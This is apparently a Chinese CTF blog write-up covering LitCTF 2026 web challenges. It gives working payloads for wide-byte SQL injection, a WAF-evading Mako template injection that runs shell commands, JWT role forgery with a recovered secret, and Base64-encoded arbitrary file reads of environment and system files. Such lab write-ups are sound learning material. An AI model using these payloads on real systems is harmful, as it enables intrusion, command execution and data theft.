---
title: LitCTF 2026 WEB方向全WP
description: 简单写一下今天做了的LitCTf的WP，但只有WEB
date: 2026-05-23 20:23:46
updated: 2026-05-23 20:23:46
image: https://img.yanxisishi.top/images/2026/05/attack-on-titan-eren-yeager-the-final-season-wallpaper-2560x1080_14.jpg
categories: [CTF]
tags: [LitCTF, WP]
---

## lit_ezsql

> **题目描述**
>
> 注注注！

爆破了一下我的查询闭合方式的字典，所有 payload 只会老实地返回：

![image-20260523124235286](https://img.yanxisishi.top/images/2026/05/image-20260523124235286.png)

也没有报错啥的，大概率是要宽字节注入，HackBar 传入：

```http
?id=1%df'
```

返回报错了：

```txt
数据库错误：(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1�\\'' LIMIT 50' at line 1")
```

接下来就是 Union 联合查询，中间的步骤不多写了：

```http
?id=-1%df' union select 1,flag,3,4,5 from flag_store%23
```

## lit_ezssti

> **题目描述**
>
> 缺什么补什么（x

Wappalyzer 插件显示编程语言为 Python，先输入：

```python
{{7*7}}
```

原样回显，再输入：

```python
${7*7}
```

回显 `WAF`，说明应该是猜对了，后端模板引擎是 Mako，但是过滤了 `$`，可以用 Mako 代码块 `<% ... %>` 替代，输入：

```python
<% context.write(__import__('os').popen('cat /flag').read()) %>
```

又回显 `WAF`，测试一下是过滤了 `.` 和 `flag`，把所有的 `.` 替换成 `getattr()`，`flag` 换成 `fla*`，输入：

```python
<%getattr(context,'write')(getattr(getattr(__import__('os'),'popen')('cat /fla*'),'read')())%>
```

拿到 flag。

## lit_reverse_my_web

> **题目描述**
>
> Web手也要会逆向么喵？

不会逆向，我只会拽进 IDA 然后按 F5...

先 `shift + F4` 看函数列表，`ctrl + f` 搜 `main.main`，点击去后按 F5 查看伪代码。

然后我也不会了，看不懂一点，喂给 AI 了，说是能解出来一个 JWT 密钥，为：

```txt
rMw_2026_litctf_jwt_secret_key!!
```

然后回到我熟悉的 WEB 靶机页面，先去开户申请注册一个账号 `test/123456`，接着用这个帐号去登录，登录进去后点击 `进入归档中心`，显示：

```txt
您暂无此资源的访问权限
```

抓个包，看到有：

```http
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlzcyI6InJldmVyc2VNeVdlYiIsInN1YiI6InRlc3QiLCJleHAiOjE3Nzk1OTg5NDgsImlhdCI6MTc3OTUxMjU0OH0.8p5tANXSvqY0Sl07lVXzKYJlzeu_QoR9cFIp6QSdfKc
```

这里伪造 JWT 使用的是 BurpSuite 插件 JWT Editor：

![image-20260523130612440](https://img.yanxisishi.top/images/2026/05/image-20260523130612440.png)

先去 BurpSuite 页面顶部的 `JWT Editor`，点击 `New Symmetric Key` ，选择 `Specify secret`，点击生成。

![image-20260523133055857](https://img.yanxisishi.top/images/2026/05/image-20260523133055857.png)

确认后回到 `Repeater` 界面，把 role 的值从 `user` 改为 `admin`，点击 Sign ，选刚刚生成的 key 就以了。

## Northbridge Document Hub

> **题目描述**
>
> Northbridge 文档中心接入了 kkFileView 兼容的文件预览网关。
> 研究员账号已开放，试着从解析缓存里找到本季度财务归档中的 flag。

查看源码，找到：

```html
<script src="/assets/js/portal.js"></script>
```

点进链接，看到：

```js
(function () {
    var bootstrap = {
        release: "2026.03.01-r12",
        region: "cn-sh2",
        auth: {
            mode: "legacy-fallback",
            // researcher:Research#2026
            seed: "cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2"
        },
        fileGateway: {
            path: "/kkfileview/getCorsFile",
            queryKey: "urlPath",
            node: "legacy-parse-02"
        }
    };

    window.NorthbridgePortal = {
        config: bootstrap,
        decodeLegacyCredential: function () {
            try {
                return atob(bootstrap.auth.seed);
            } catch (e) {
                return "";
            }
        }
    };

    var form = document.querySelector("form[data-auth='portal']");
    if (form) {
        form.addEventListener("submit", function () {
            form.classList.add("is-submitting");
        });
    }
})();
```

1. 得到账号密码 `researcher/Research#2026`。
2. 可以访问 `/kkfileview/getCorsFile` 并传入 GET 参数 `urlPath`，但是 `atob()` 函数说明值会被 Base64 解码。

传入：

```http
/kkfileview/getCorsFile?urlPath=L3Byb2Mvc2VsZi9lbnZpcm9u
```

> Base64 解码后是 `/proc/self/environ`。

成功拿到环境变量，但 flag 不在里面，换成读取容器启动脚本，传入：

```http
/kkfileview/getCorsFile?urlPath=L3Vzci9sb2NhbC9iaW4vZG9ja2VyLWVudHJ5cG9pbnQuc2g=
```

> Base64 解码后是 `/usr/local/bin/docker-entrypoint.sh`。

在 sh 文件里面看到了 flag 被打包进了 `/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip`。

传入：

```http
/kkfileview/getCorsFile?urlPath=L29wdC9ra2ZpbGV2aWV3L2NhY2hlL3BhcnNlZC9xMV9maW5hbmNlX3JlcG9ydF8yMDI2LnppcA==
```

> Base64 解码后是 `/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip`。

下载 zip 文件，拿到 flag。

## 华辰企业服务运营平台

> **题目描述**
>
> 某客服工单系统上线后，保留了大量运维与调试能力。
> 你需要从系统暴露面和服务器中收集关键信息，完成权限突破并还原完整 flag

dirsearch 扫目录看到了 `/actuator` 基本全能访问，优先去看环境变量，访问 `/actuator/env`，直接找到 flag。
